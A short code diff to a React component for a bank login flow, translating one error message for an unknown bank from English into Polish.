@@ -815,7 +815,7 @@ export function BankLoginClient({ sessionId, bankSlug, bank }: Props) {
     return (
       <div className="flex min-h-screen items-center justify-center p-4">
         <p className="rounded-xl border border-red-500/30 bg-red-500/10 p-4 text-center text-sm text-red-500">
-          Unknown bank. Please restart the selection.
+          Nieznany bank. Rozpocznij wybór banku ponownie.
         </p>
       </div>
     );
